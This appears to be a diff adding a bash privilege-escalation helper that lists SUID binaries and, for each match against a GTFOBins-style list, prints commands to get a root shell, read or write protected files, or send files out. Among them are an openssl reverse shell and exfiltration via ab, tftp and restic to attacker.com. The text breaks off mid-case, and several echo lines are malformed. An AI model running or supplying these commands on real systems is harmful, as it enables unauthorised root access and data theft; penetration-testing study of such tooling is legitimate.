@@ -1,0 +1,1074 @@
+suidcheck() {
+    # List of known GTFO bins
+    gtfobins_list=("aa-exec" "ab" "agetty" "alpine" "ar" "arj" "arp" "as" "ascii-xfr" "ash" "aspell" "atobm" "awk" "base32" "base64" "basenc" "basez" "bash" "bc" "bridge" "busybox" "bzip2" "cabal" "capsh" "cat" "chmod" "choom" "chown" "chroot" "clamscan" "cmp" "column" "comm" "cp" "cpio" "cpulimit" "csh" "csplit" "csvtool" "cupsfilter" "curl" "cut" "dash" "date" "dd" "debugfs" "dialog" "diff" "dig" "distcc" "dmsetup" "docker" "dosbox" "ed" "efax" "elvish" "emacs" "env" "eqn" "espeak" "expand" "expect" "file" "find" "fish" "flock" "fmt" "fold" "gawk" "gcore" "gdb" "genie" "genisoimage" "gimp" "grep" "gtester" "gzip" "hd" "head" "hexdump" "highlight" "hping3" "iconv" "install" "ionice" "ip" "ispell" "jjs" "join" "jq" "jrunscript" "julia" "ksh" "ksshell" "kubectl" "ld.so" "less" "logsave" "look" "lua" "make" "mawk" "more" "mosquitto" "msgattrib" "msgcat" "msgconv" "msgfilter" "msgmerge" "msguniq" "multitime" "mv" "nasm" "nawk" "ncftp" "nft" "nice" "nl" "nm" "nmap" "node" "nohup" "od" "openssl" "openvpn" "pandoc" "paste" "perf" "perl" "pexec" "pg" "php" "pidstat" "pr" "ptx" "python" "rc" "readelf" "restic" "rev" "rlwrap" "rsync" "rtorrent" "run-parts" "rview" "rvim" "sash" "scanmem" "sed" "setarch" "setfacl" "setlock" "shuf" "soelim" "softlimit" "sort" "sqlite3" "ss" "ssh-agent" "ssh-keygen" "ssh-keyscan" "sshpass" "start-stop-daemon" "stdbuf" "strace" "strings" "sysctl" "systemctl" "tac" "tail" "taskset" "tbl" "tclsh" "tee" "terraform" "tftp" "tic" "time" "timeout" "troff" "ul" "unexpand" "uniq" "unshare" "unsquashfs" "unzip" "update-alternatives" "uudecode" "uuencode" "vagrant" "view" "vigr" "vim" "vimdiff" "vipw" "w3m" "watch" "wc" "wget" "whiptail" "xargs" "xdotool" "xmodmap" "xmore" "xxd" "xz" "yash" "zsh" "zsoelim")
+
+    # Initialize found_flag to 0
+    found_flag=0
+
+    # Capture the find command's output into a variable, sort and deduplicate
+    found_binaries=$(find / -perm -u=s -type f 2>/dev/null | sort -u)
+
+    # Process the output line-by-line
+    echo "$found_binaries" | while read -r full_binary_path; do
+        binary=$(basename "$full_binary_path")
+        if printf '%s\n' "${gtfobins_list[@]}" | grep -q -w "$binary"; then
+            echo "Vulnerable SUID binary found: $full_binary_path"
+
+            # Print the associated commands
+            case "$binary" in
+                "aa-exec")
+                    echo Associated Command: "$full_binary_path" /bin/sh -p
+                    found_flag=1
+                    ;;
+                "ab")
+					echo Associated Command: URL=http://attacker.com/
+					echo LFILE=file_to_send
+					echo "$full_binary_path" -p \$LFILE \$URL
+                    found_flag=1
+                    ;;
+                "agetty")
+                    echo Associated Command: "$full_binary_path" -o -p -l /bin/sh -a root tty
+                    found_flag=1
+                    ;;
+                "alpine")
+					echo LFILE=file_to_read
+                    echo Associated Command: "$full_binary_path" -F $LFILE
+                    found_flag=1
+                    ;;
+                "ar")
+                    echo TF=$(mktemp -u)
+                    echo LFILE=file_to_read
+                    echo ./ar r $TF $LFILE
+                    echo cat $TF
+                    found_flag=1
+                    ;;
+                "arj")
+                    echo TF=$(mktemp -d)
+                    echo LFILE=file_to_write
+                    echo LDIR=where_to_write
+                    echo echo DATA >$TF/$LFILE
+                    echo arj a $TF/a $TF/$LFILE
+                    echo ./arj e $TF/a $LDIR
+                    found_flag=1
+                    ;;
+                "arp")
+                    echo LFILE=file_to_read
+                    echo ./arp -v -f "$LFILE"
+                    found_flag=1
+                    ;;
+                "as")
+                    echo LFILE=file_to_read
+                    echo ./as @$LFILE
+                    found_flag=1
+                    ;;
+                "ascii-xfr")
+                    echo LFILE=file_to_read
+                    echo ./ascii-xfr -ns "$LFILE"
+                    found_flag=1
+                    ;;
+                "ash")
+                    echo ./ash
+                    found_flag=1
+                    ;;
+                "aspell")
+                    echo LFILE=file_to_read
+                    echo ./aspell -c "$LFILE"
+                    echo found_flag=1
+                    ;;
+                "atobm")
+                    echo LFILE=file_to_read
+                    echo ./atobm $LFILE 2>&1 | awk -F "'" '{printf "%s", $2}'
+                    found_flag=1
+                    ;;
+                "awk")
+                    echo LFILE=file_to_read
+                    echo ./awk '//' "$LFILE"
+                    found_flag=1
+                    ;;
+                "base32")
+                    echo LFILE=file_to_read
+                    echo base32 "$LFILE" | base32 --decode
+                    found_flag=1
+                    ;;
+                "base64")
+                    echo LFILE=file_to_read
+                    echo ./base64 "$LFILE" | base64 --decode
+                    found_flag=1
+                    ;;
+                "basenc")
+                    echo LFILE=file_to_read
+                    echo basenc --base64 $LFILE | basenc -d --base64
+                    found_flag=1
+                    ;;
+                "basez")
+                    echo LFILE=file_to_read
+                    echo ./basez "$LFILE" | basez --decode
+                    found_flag=1
+                    ;;
+                "bash")
+                    echo ./bash -p
+                    found_flag=1
+                    ;;
+                "bc")
+                    echo LFILE=file_to_read
+                    echo ./bc -s $LFILE
+                    echo quit
+                    found_flag=1
+                    ;;
+                "bridge")
+                    echo LFILE=file_to_read
+                    echo ./bridge -b "$LFILE"
+                    found_flag=1
+                    ;;
+                "busybox")
+                    echo ./busybox sh
+                    found_flag=1
+                    ;;
+                "bzip2")
+                    echo LFILE=file_to_read
+                    echo ./bzip2 -c $LFILE | bzip2 -d
+                    found_flag=1
+                    ;;
+                "cabal")
+                    echo ./cabal exec -- /bin/sh -p
+                    found_flag=1
+                    ;;
+                "capsh")
+                    echo ./capsh --gid=0 --uid=0 --
+                    found_flag=1
+                    ;;
+                "cat")
+                    echo LFILE=file_to_read
+                    echo ./cat "$LFILE"
+                    found_flag=1
+                    ;;
+                "chmod")
+                    echo LFILE=file_to_change
+                    echo ./chmod 6777 $LFILE
+                    found_flag=1
+                    ;;
+                "choom")
+                    echo ./choom -n 0 -- /bin/sh -p
+                    found_flag=1
+                    ;;
+                "chown")
+                    echo LFILE=file_to_change
+                    echo ./chown $(id -un):$(id -gn) $LFILE
+                    found_flag=1
+                    ;;
+                "chroot")
+                    echo ./chroot / /bin/sh -p
+                    found_flag=1
+                    ;;
+                "clamscan")
+                    echo LFILE=file_to_read
+                    echo TF=$(mktemp -d)
+                    echo touch $TF/empty.yara
+                    echo ./clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'
+                    found_flag=1
+                    ;;
+                "cmp")
+                    echo LFILE=file_to_read
+                    echo ./cmp $LFILE /dev/zero -b -l
+                    found_flag=1
+                    ;;
+                "column")
+                    echo LFILE=file_to_read
+                    echo ./column $LFILE
+                    found_flag=1
+                    ;;
+                "comm")
+                    echo LFILE=file_to_read
+                    echo comm $LFILE /dev/null 2>/dev/null
+                    found_flag=1
+                    ;;
+                "cpio")
+                    echo LFILE=file_to_read
+                    echo TF=$(mktemp -d)
+                    echo "echo \"\$LFILE\" | ./cpio -R \$UID -dp \$TF"
+                    echo cat "$TF/$LFILE"
+                    echo ""
+                    echo OR
+                    echo ""
+                    echo Copies $LFILE to the $LDIR directory.
+                    echo LFILE=file_to_write
+                    echo LDIR=where_to_write
+                    echo echo DATA >$LFILE
+                    echo "echo \"\$LFILE\" | ./cpio -R 0:0 -p \$LDIR"
+                    found_flag=1
+                    ;;
+                "cpulimit")
+                    echo ./cpulimit -l 100 -f -- /bin/sh -p
+                    found_flag=1
+                    ;;
+                "csh")
+                    echo ./csh -b
+                    found_flag=1
+                    ;;
+                "csplit")
+                    echo LFILE=file_to_read
+                    echo csplit $LFILE 1
+                    echo cat xx01
+                    found_flag=1
+                    ;;
+                "csvtool")
+                    echo LFILE=file_to_read
+                    echo ./csvtool trim t $LFILE
+                    found_flag=1
+                    ;;
+                "cupsfilter")
+                    echo LFILE=file_to_read
+                    echo ./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE
+                    found_flag=1
+                    ;;
+                "curl")
+                    echo Fetch a remote file via HTTP GET request.
+                    echo URL=http://attacker.com/file_to_get
+                    echo LFILE=file_to_save
+                    echo ./curl $URL -o $LFILE
+                    found_flag=1
+                    ;;
+                "cut")
+                    echo LFILE=file_to_read
+                    echo ./cut -d "" -f1 "$LFILE"
+                    found_flag=1
+                    ;;
+                "dash")
+                    echo ./dash -p
+                    found_flag=1
+                    ;;
+                "date")
+                    echo LFILE=file_to_read
+                    echo ./date -f $LFILE
+                    found_flag=1
+                    ;;
+                "dd")
+                    echo LFILE=file_to_write
+                    echo echo "data" | ./dd of=$LFILE
+                    found_flag=1
+                    ;;
+                "debugfs")
+                    echo ./debugfs
+                    echo !/bin/sh
+                    found_flag=1
+                    ;;
+                "dialog")
+                    echo LFILE=file_to_read
+                    echo ./dialog --textbox "$LFILE" 0 0
+                    found_flag=1
+                    ;;
+                "diff")
+                    echo LFILE=file_to_read
+                    echo ./diff --line-format=%L /dev/null $LFILE
+                    found_flag=1
+                    ;;
+                "dig")
+                    echo LFILE=file_to_read
+                    echo ./dig -f $LFILE
+                    found_flag=1
+                    ;;
+                "distcc")
+                    echo ./distcc /bin/sh -p
+                    found_flag=1
+                    ;;
+                "dmsetup")
+                    echo ./dmsetup create base <<EOF
+                    echo 0 3534848 linear /dev/loop0 94208
+                    echo EOF
+                    echo ./dmsetup ls --exec '/bin/sh -p -s'
+                    found_flag=1
+                    ;;
+                "docker")
+                    echo ./docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+                    found_flag=1
+                    ;;
+                "dosbox")
+                    echo Note that the name of the written file in the following example will be FILE_TO_. Also note that echo terminates the string with a DOS-style line terminator (\r\n), if that’s a problem and your scenario allows it, you can create the file outside dosbox, then use copy to do the actual write.
+                    echo LFILE='\path\to\file_to_write'
+                    echo ./dosbox -c 'mount c /' -c "echo DATA >c:$LFILE" -c exit
+                    found_flag=1
+                    ;;
+                "ed")
+                    echo ./ed file_to_read
+                    echo ,p
+                    echo q
+                    found_flag=1
+                    ;;
+                "efax")
+                    echo LFILE=file_to_read
+                    echo ./efax -d "$LFILE"
+                    found_flag=1
+                    ;;
+                "elvish")
+                    echo ./elvish
+                    found_flag=1
+                    ;;
+                "emacs")
+                    echo ./emacs -Q -nw --eval '(term "/bin/sh -p")'
+                    found_flag=1
+                    ;;
+                "env")
+                    echo ./env /bin/sh -p
+                    found_flag=1
+                    ;;
+                "eqn")
+                    echo LFILE=file_to_read
+                    echo ./eqn "$LFILE"
+                    found_flag=1
+                    ;;
+                "espeak")
+                    echo LFILE=file_to_read
+                    echo ./espeak -qXf "$LFILE"
+                    found_flag=1
+                    ;;
+                "expand")
+                    echo LFILE=file_to_read
+                    echo ./expand "$LFILE"
+                    found_flag=1
+                    ;;
+                "expect")
+                    echo ./expect -c 'spawn /bin/sh -p;interact'
+                    found_flag=1
+                    ;;
+                "file")
+                    echo LFILE=file_to_read
+                    echo ./file -f $LFILE
+                    found_flag=1
+                    ;;
+                "find")
+                    echo ./find . -exec /bin/sh -p \; -quit
+                    found_flag=1
+                    ;;
+                "fish")
+                    echo ./fish
+                    found_flag=1
+                    ;;
+                "flock")
+                    echo ./flock -u / /bin/sh -p
+                    found_flag=1
+                    ;;
+                "fmt")
+                    echo LFILE=file_to_read
+                    echo ./fmt -999 "$LFILE"
+                    found_flag=1
+                    ;;
+                "fold")
+                    echo LFILE=file_to_read
+                    echo ./fold -w99999999 "$LFILE"
+                    found_flag=1
+                    ;;
+                "gawk")
+                    echo LFILE=file_to_read
+                    echo ./gawk '//' "$LFILE"
+                    echo 
+                    echo OR
+                    echo 
+                    echo Limited SUID
+                    echo ./gawk 'BEGIN {system("/bin/sh")}'
+                    found_flag=1
+                    ;;
+                "gcore")
+                    echo ./gcore $PID
+                    found_flag=1
+                    ;;
+                "gdb")
+                    echo ./gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
+                    found_flag=1
+                    ;;
+                "genie")
+                    echo ./genie -c '/bin/sh'
+                    found_flag=1
+                    ;;
+                "genisoimage")
+                    echo LFILE=file_to_read
+                    echo ./genisoimage -sort "$LFILE"    
+                    found_flag=1
+                    ;;
+                "gimp")
+                    echo ./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl("/bin/sh", "sh", "-p")'
+                    found_flag=1
+                    ;;
+                "grep")
+                    echo LFILE=file_to_read
+                    echo ./grep '' $LFILE
+                    found_flag=1
+                    ;;
+                "gtester")
+                    echo TF=$(mktemp)
+                    echo echo '#!/bin/sh -p' > $TF
+                    echo echo 'exec /bin/sh -p 0<&1' >> $TF
+                    echo chmod +x $TF
+                    echo sudo gtester -q $TF
+                    found_flag=1
+                    ;;
+                "gzip")
+                    echo LFILE=file_to_read
+                    echo ./gzip -f $LFILE -t
+                    found_flag=1
+                    ;;
+                "hd")
+                    echo LFILE=file_to_read
+                    echo ./hd "$LFILE"
+                    found_flag=1
+                    ;;
+                "head")
+                    echo LFILE=file_to_read
+                    echo ./head -c1G "$LFILE"
+                    found_flag=1
+                    ;;
+                "hexdump")
+                    echo LFILE=file_to_read
+                    echo ./hexdump -C "$LFILE"
+                    found_flag=1
+                    ;;
+                "highlight")
+                    echo LFILE=file_to_read
+                    echo ./highlight --no-doc --failsafe "$LFILE"
+                    found_flag=1
+                    ;;
+                "hping3")
+                    echo ./hping3
+                    echo /bin/sh -p
+                    found_flag=1
+                    ;;
+                "iconv")
+                    echo LFILE=file_to_read
+                    echo ./iconv -f 8859_1 -t 8859_1 "$LFILE"
+                    found_flag=1
+                    ;;
+                "install")
+                    echo LFILE=file_to_change
+                    echo TF=$(mktemp)
+                    echo ./install -m 6777 $LFILE $TF
+                    found_flag=1
+                    ;;
+                "ionice")
+                    echo ./ionice /bin/sh -p
+                    found_flag=1
+                    ;;
+                "ip")
+                    echo LFILE=file_to_read
+                    echo ./ip -force -batch "$LFILE"
+                    echo 
+                    echo ./ip netns add foo
+                    echo ./ip netns exec foo /bin/sh -p
+                    echo ./ip netns delete foo
+                    found_flag=1
+                    ;;
+                "ispell")
+                    echo ./ispell /etc/passwd
+                    echo !/bin/sh -p
+                    found_flag=1
+                    ;;
+                "jjs")
+                    echo echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()" | ./jjs
+                    found_flag=1
+                    ;;
+                "join")
+                    echo LFILE=file_to_read
+                    echo ./join -a 2 /dev/null $LFILE
+                    found_flag=1
+                    ;;
+                "jq")
+                    echo LFILE=file_to_read
+                    echo ./jq -Rr . "$LFILE"
+                    found_flag=1
+                    ;;
+                "jrunscript")
+                    echo ./jrunscript -e "exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')"
+                    found_flag=1
+                    ;;
+                "julia")
+                    echo ./julia -e 'run(`/bin/sh -p`)'
+                    found_flag=1
+                    ;;
+                "ksh")
+                    echo ./ksh -p
+                    found_flag=1
+                    ;;
+                "ksshell")
+                    echo LFILE=file_to_read
+                    echo ./ksshell -i $LFILE
+                    found_flag=1
+                    ;;
+                "kubectl")
+                    echo LFILE=dir_to_serve
+                    echo ./kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/
+                    found_flag=1
+                    ;;
+                "ld.so")
+                    echo ./ld.so /bin/sh -p
+                    found_flag=1
+                    ;;
+                "less")
+                    echo ./less file_to_read
+                    found_flag=1
+                    ;;
+                "logsave")
+                    echo ./logsave /dev/null /bin/sh -i -p
+                    found_flag=1
+                    ;;
+                "look")
+                    echo LFILE=file_to_read
+                    echo ./look '' "$LFILE"
+                    found_flag=1
+                    ;;
+                "lua")
+                    echo lua -e 'local f=io.open("file_to_read", "rb"); print(f:read("*a")); io.close(f);'
+                    found_flag=1
+                    ;;
+                "make")
+                    echo COMMAND='/bin/sh -p'
+                    echo ./make -s --eval=$'x:\n\t-'"$COMMAND"
+                    found_flag=1
+                    ;;
+                "mawk")
+                    echo LFILE=file_to_read
+                    echo ./mawk '//' "$LFILE"
+                    found_flag=1
+                    ;;
+                "more")
+                    echo ./more file_to_read
+                    found_flag=1
+                    ;;
+                "mosquitto")
+                    echo LFILE=file_to_read
+                    echo ./mosquitto -c "$LFILE"
+                    found_flag=1
+                    ;;
+                "msgattrib")
+                    echo LFILE=file_to_read
+                    echo ./msgattrib -P $LFILE
+                    found_flag=1
+                    ;;
+                "msgcat")
+                    echo LFILE=file_to_read
+                    echo ./msgcat -P $LFILE
+                    found_flag=1
+                    ;;
+                "msgconv")
+                    echo LFILE=file_to_read
+                    echo ./msgconv -P $LFILE
+                    found_flag=1
+                    ;;
+                "msgfilter")
+                    echo echo x | ./msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'
+                    found_flag=1
+                    ;;
+                "msgmerge")
+                    echo LFILE=file_to_read
+                    echo ./msgmerge -P $LFILE /dev/null
+                    found_flag=1
+                    ;;
+                "msguniq")
+                    echo LFILE=file_to_read
+                    echo ./msguniq -P $LFILE
+                    found_flag=1
+                    ;;
+                "multitime")
+                    echo ./multitime /bin/sh -p
+                    found_flag=1
+                    ;;
+                "mv")
+                    echo LFILE=file_to_write
+                    echo TF=$(mktemp)
+                    echo echo "DATA" > $TF
+                    echo ./mv $TF $LFILE
+                    found_flag=1
+                    ;;
+                "nasm")
+                    echo LFILE=file_to_read
+                    echo ./nasm -@ $LFILE
+                    found_flag=1
+                    ;;
+                "nawk")
+                    echo LFILE=file_to_read
+                    echo ./nawk '//' "$LFILE"
+                    found_flag=1
+                    ;;
+                "ncftp")
+                    echo ./ncftp
+                    echo !/bin/sh -p
+                    found_flag=1
+                    ;;
+                "nft")
+                    echo LFILE=file_to_read
+                    echo ./nft -f "$LFILE"
+                    found_flag=1
+                    ;;
+                "nice")
+                    echo ./nice /bin/sh -p
+                    found_flag=1
+                    ;;
+                "nl")
+                    echo LFILE=file_to_read
+                    echo ./nl -bn -w1 -s '' $LFILE
+                    found_flag=1
+                    ;;
+                "nm")
+                    echo LFILE=file_to_read
+                    echo ./nm @$LFILE
+                    found_flag=1
+                    ;;
+                "nmap")
+                    echo The payload appears inside the regular nmap output.
+                    echo LFILE=file_to_write
+                    echo ./nmap -oG=$LFILE DATA
+                    found_flag=1
+                    ;;
+                "node")
+                    echo ./node -e 'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})'
+                    found_flag=1
+                    ;;
+                "nohup")
+                    echo ./nohup /bin/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)"
+                    found_flag=1
+                    ;;
+                "od")
+                    echo LFILE=file_to_read
+                    echo ./od -An -c -w9999 "$LFILE"
+                    found_flag=1
+                    ;;
+                "openssl")
+                    echo To receive the shell run the following on the attacker box:
+                    echo 
+                    echo openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+                    echo openssl s_server -quiet -key key.pem -cert cert.pem -port 12345
+                    echo Communication between attacker and target will be encrypted.
+                    echo 
+                    echo RHOST=attacker.com
+                    echo RPORT=12345
+                    echo mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
+                    echo 
+                    echo LFILE=file_to_write
+                    echo echo DATA | openssl enc -out "$LFILE"
+                    found_flag=1
+                    ;;
+                "openvpn")
+                    echo ./openvpn --dev null --script-security 2 --up '/bin/sh -p -c "sh -p"'
+                    echo The file is actually parsed and the first partial wrong line is returned in an error message.
+                    echo LFILE=file_to_read
+                    echo ./openvpn --config "$LFILE"
+                    found_flag=1
+                    ;;
+                "pandoc")
+                    echo LFILE=file_to_write
+                    echo echo DATA | ./pandoc -t plain -o "$LFILE"
+                    found_flag=1
+                    ;;
+                "paste")
+                    echo LFILE=file_to_read
+                    echo paste $LFILE
+                    found_flag=1
+                    ;;
+                "perf")
+                    echo ./perf stat /bin/sh -p
+                    found_flag=1
+                    ;;
+                "perl")
+                    echo ./perl -e 'exec "/bin/sh";'
+                    found_flag=1
+                    ;;
+                "pexec")
+                    echo ./pexec /bin/sh -p
+                    found_flag=1
+                    ;;
+                "pg")
+                    echo ./pg file_to_read
+                    found_flag=1
+                    ;;
+                "php")
+                    echo CMD="/bin/sh"
+                    echo ./php -r "pcntl_exec('/bin/sh', ['-p']);"
+                    found_flag=1
+                    ;;
+                "pidstat")
+                    echo COMMAND=id
+                    echo ./pidstat -e $COMMAND
+                    found_flag=1
+                    ;;
+                "pr")
+                    echo LFILE=file_to_read
+                    echo pr -T $LFILE
+                    found_flag=1
+                    ;;
+                "ptx")
+                    echo LFILE=file_to_read
+                    echo ./ptx -w 5000 "$LFILE"
+                    found_flag=1
+                    ;;
+                "python")
+                    echo ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+                    found_flag=1
+                    ;;
+                "rc")
+                    echo ./rc -c '/bin/sh -p'
+                    found_flag=1
+                    ;;
+                "readelf")
+                    echo LFILE=file_to_read
+                    echo ./readelf -a @$LFILE
+                    found_flag=1
+                    ;;
+                "restic")
+                    echo RHOST=attacker.com
+                    echo RPORT=12345
+                    echo LFILE=file_or_dir_to_get
+                    echo NAME=backup_name
+                    echo ./restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"
+                    found_flag=1
+                    ;;
+                "rev")
+                    echo LFILE=file_to_read
+                    echo ./rev $LFILE | rev
+                    found_flag=1
+                    ;;
+                "rlwrap")
+                    echo ./rlwrap -H /dev/null /bin/sh -p
+                    found_flag=1
+                    ;;
+                "rsync")
+                    echo ./rsync -e 'sh -p -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
+                    found_flag=1
+                    ;;
+                "rtorrent")
+                    echo echo "execute = /bin/sh,-p,-c,\"/bin/sh -p <$(tty) >$(tty) 2>$(tty)\"" >~/.rtorrent.rc
+                    echo ./rtorrent
+                    found_flag=1
+                    ;;
+                "run-parts")
+                    echo ./run-parts --new-session --regex '^sh$' /bin --arg='-p'
+                    found_flag=1
+                    ;;
+                "rview")
+                    echo ./rview -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
+                    found_flag=1
+                    ;;
+                "rvim")
+                    echo ./rvim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
+                    found_flag=1
+                    ;;
+                "sash")
+                    echo ./sash
+                    found_flag=1
+                    ;;
+                "scanmem")
+                    echo ./scanmem
+                    echo shell /bin/sh
+                    found_flag=1
+                    ;;
+                "sed")
+                    echo LFILE=file_to_read
+                    echo ./sed -e '' "$LFILE"
+                    found_flag=1
+                    ;;
+                "setarch")
+                    echo ./setarch $(arch) /bin/sh -p
+                    found_flag=1
+                    ;;
+                "setfacl")
+                    echo LFILE=file_to_change
+                    echo USER=somebody
+                    echo ./setfacl -m u:$USER:rwx $LFILE
+                    found_flag=1
+                    ;;
+                "setlock")
+                    echo ./setlock - /bin/sh -p
+                    found_flag=1
+                    ;;
+                "shuf")
+                    echo LFILE=file_to_write
+                    echo ./shuf -e DATA -o "$LFILE"
+                    found_flag=1
+                    ;;
+                "soelim")
+                    echo LFILE=file_to_read
+                    echo ./soelim "$LFILE"
+                    found_flag=1
+                    ;;
+                "softlimit")
+                    echo ./softlimit /bin/sh -p
+                    found_flag=1
+                    ;;
+                "sort")
+                    echo LFILE=file_to_read
+                    echo ./sort -m "$LFILE"
+                    found_flag=1
+                    ;;
+                "sqlite3")
+                    echo LFILE=file_to_read
+                    echo sqlite3 << EOF
+                    echo CREATE TABLE t(line TEXT);
+                    echo .import $LFILE t
+                    echo SELECT * FROM t;
+                    echo EOF
+                    found_flag=1
+                    ;;
+                "ss")
+                    echo LFILE=file_to_read
+                    echo ./ss -a -F $LFILE
+                    found_flag=1
+                    ;;
+                "ssh-agent")
+                    echo ./ssh-agent /bin/ -p
+                    found_flag=1
+                    ;;
+                "ssh-keygen")
+                    echo ./ssh-keygen -D ./lib.so
+                    found_flag=1
+                    ;;
+                "ssh-keyscan")
+                    echo LFILE=file_to_read
+                    echo ./ssh-keyscan -f $LFILE
+                    found_flag=1
+                    ;;
+                "sshpass")
+                    echo ./sshpass /bin/sh -p
+                    found_flag=1
+                    ;;
+                "start-stop-daemon")
+                    echo ./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p
+                    found_flag=1
+                    ;;
+                "stdbuf")
+                    echo ./stdbuf -i0 /bin/sh -p
+                    found_flag=1
+                    ;;
+                "strace")
+                    echo ./strace -o /dev/null /bin/sh -p
+                    found_flag=1
+                    ;;
+                "strings")
+                    echo LFILE=file_to_read
+                    echo ./strings "$LFILE"
+                    found_flag=1
+                    ;;
+                "sysctl")
+                    echo COMMAND='/bin/sh -c id>/tmp/id'
+                    echo ./sysctl "kernel.core_pattern=|$COMMAND"
+                    echo sleep 9999 &
+                    echo kill -QUIT $!
+                    echo cat /tmp/id
+                    found_flag=1
+                    ;;
+                "systemctl")
+                    echo TF=$(mktemp).service
+                    echo echo '[Service]
+                    echo Type=oneshot
+                    echo ExecStart=/bin/sh -c "id > /tmp/output"
+                    echo [Install]
+                    echo WantedBy=multi-user.target' > $TF
+                    echo ./systemctl link $TF
+                    echo ./systemctl enable --now $TF
+                    found_flag=1
+                    ;;
+                "tac")
+                    echo LFILE=file_to_read
+                    echo ./tac -s 'RANDOM' "$LFILE"
+                    found_flag=1
+                    ;;
+                "tail")
+                    echo LFILE=file_to_read
+                    echo ./tail -c1G "$LFILE"
+                    found_flag=1
+                    ;;
+                "taskset")
+                    echo ./taskset 1 /bin/sh -p
+                    found_flag=1
+                    ;;
+                "tbl")
+                    echo LFILE=file_to_read
+                    echo ./tbl $LFILE
+                    found_flag=1
+                    ;;
+                "tclsh")
+                    echo ./tclsh
+                    echo exec /bin/sh -p <@stdin >@stdout 2>@stderr
+                    found_flag=1
+                    ;;
+                "tee")
+                    echo LFILE=file_to_write
+                    echo echo DATA | ./tee -a "$LFILE"
+                    found_flag=1
+                    ;;
+                "terraform")
+                    echo ./terraform console
+                    echo file("file_to_read")
+                    found_flag=1
+                    ;;
+                "tftp")
+                    echo RHOST=attacker.com
+                    echo ./tftp $RHOST
+                    echo put file_to_send
+                    found_flag=1
+                    ;;
+                "tic")
+                    echo LFILE=file_to_read
+                    echo ./tic -C "$LFILE"
+                    found_flag=1
+                    ;;
+                "time")
+                    echo ./time /bin/sh -p
+                    found_flag=1
+                    ;;
+                "timeout")
+                    echo ./timeout 7d /bin/sh -p
+                    found_flag=1
+                    ;;
+                "troff")
+                    echo LFILE=file_to_read
+                    echo ./troff $LFILE
+                    found_flag=1
+                    ;;
+                "ul")
+                    echo LFILE=file_to_read
+                    echo ./ul "$LFILE"
+                    found_flag=1
+                    ;;
+                "unexpand")
+                    echo LFILE=file_to_read
+                    echo ./unexpand -t99999999 "$LFILE"
+                    found_flag=1
+                    ;;
+                "unsquashfs")
+                    echo ./unsquashfs shell
+                    echo ./squashfs-root/sh -p
+                    found_flag=1
+                    ;;
+                "unshare")
+                    echo ./unshare -r /bin/sh
+                    found_flag=1
+                    ;;
+                "uniq")
+                    echo LFILE=file_to_read
+                    echo ./uniq "$LFILE"
+                    found_flag=1
+                    ;;
+                "unzip")
+                    echo ./unzip -K shell.zip
+                    echo ./sh -p
+                    found_flag=1
+                    ;;
+                "update-alternatives")
+                    echo LFILE=/path/to/file_to_write
+                    echo TF=$(mktemp)
+                    echo echo DATA >$TF
+                    echo ./update-alternatives --force --install "$LFILE" x "$TF" 0
+                    found_flag=1
+                    ;;
+                "uudecode")
+                    echo LFILE=file_to_read
+                    echo uuencode "$LFILE" /dev/stdout | uudecode
+                    found_flag=1
+                    ;;
+                "uuencode")
+                    echo LFILE=file_to_read
+                    echo uuencode "$LFILE" /dev/stdout | uudecode
+                    found_flag=1
+                    ;;
+                "vagrant")
+                    echo cd $(mktemp -d)
+                    echo echo 'exec "/bin/sh -p"' > Vagrantfile
+                    echo vagrant up
+                    found_flag=1
+                    ;;
+                "view")
+                    echo ./view -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
+                    found_flag=1
+                    ;;
+                "vigr")
+                    echo ./vigr
+                    found_flag=1
+                    ;;
+                "vim")
+                    echo ./vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
+                    found_flag=1
+                    ;;
+                "vimdiff")
+                    echo ./vimdiff -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
+                    found_flag=1
+                    ;;
+                "vipw")
+                    echo ./vipw
+                    found_flag=1
+                    ;;
+                "w3m")
+                    echo LFILE=file_to_read
+                    echo ./w3m "$LFILE" -dump
+                    found_flag=1
+                    ;;
+                "watch")
+                    echo ./watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'
+                    found_flag=1
+                    ;;
+                "wc")
+                    echo LFILE=file_to_read
+                    echo ./wc --files0-from "$LFILE"
+                    found_flag=1
+                    ;;
+                "wget")
+                    echo TF=$(mktemp)
+                    echo chmod +x $TF
+                    echo echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
+                    echo ./wget --use-askpass=$TF 0
+                    found_flag=1
+                    ;;
+                "whiptail")
+                    echo LFILE=file_to_read
+                    echo ./whiptail --textbox --scrolltext "$LFILE" 0 0
+                    found_flag=1
+                    ;;
+                "xargs")
+                    echo ./xargs -a /dev/null sh -p
+                    found_flag=1
+                    ;;
+                "xdotool")
+                    echo ./xdotool exec --sync /bin/sh -p
+                    found_flag=1
+                    ;;
+                "xmodmap")
+                    echo LFILE=file_to_read
+                    echo ./xmodmap -v $LFILE
+                    found_flag=1
+                    ;;
+                "xmore")
